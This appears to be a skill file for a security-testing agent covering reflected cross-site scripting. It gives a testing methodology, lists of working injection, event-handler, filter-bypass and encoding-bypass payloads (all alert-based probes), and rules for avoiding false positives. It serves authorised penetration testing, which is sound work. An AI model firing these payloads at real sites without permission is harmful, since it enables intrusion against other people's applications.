---
name: xss_reflected
description: Reflected XSS testing with filter bypass techniques
category: injection
bug_class: xss
triggers:
  - xss
  - cross-site scripting
  - reflected
  - html injection
---

# Reflected XSS Testing

## Key Insight
Reflected XSS occurs when user input is reflected in the HTTP response without proper sanitization. The key is finding reflection points and determining the execution context.

## Attack Surface
- URL query parameters
- Form fields (search, login, contact)
- HTTP headers (Referer, User-Agent)
- URL path segments
- Error messages that reflect input

## Methodology
1. **Discovery**: Identify all input vectors on the target
2. **Reflection Testing**: Send unique markers and check if they appear in response
3. **Context Analysis**: Determine where the reflection occurs (HTML, attribute, JS, CSS)
4. **Payload Crafting**: Craft payloads based on the context
5. **Filter Bypass**: Test encoding, case variation, tag alternatives
6. **Validation**: Confirm execution with safe payloads (alert/prompt)

## Techniques

### Basic Reflection
```
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

### Event Handler Injection
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

### Filter Bypass
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<SCRIPT>alert(1)</SCRIPT>
<img SRC=x onerror=alert(1)>
<svg/onload=alert(1)>
```

### Encoding Bypass
```
javascript:alert(1)
&#x6A;avascript:alert(1)
\u003cscript\u003ealert(1)\u003c/script\u003e
```

## Validation
- Use `alert(document.domain)` to confirm execution context
- Check if Content-Type is text/html (not application/json)
- Verify CSP headers don't block inline scripts
- Test in different browsers if possible

## False Positive Avoidance
- HTML-encoded output (&lt;script&gt;) is NOT vulnerable
- JSON responses with proper Content-Type are NOT vulnerable
- Text-only responses without HTML context are NOT vulnerable
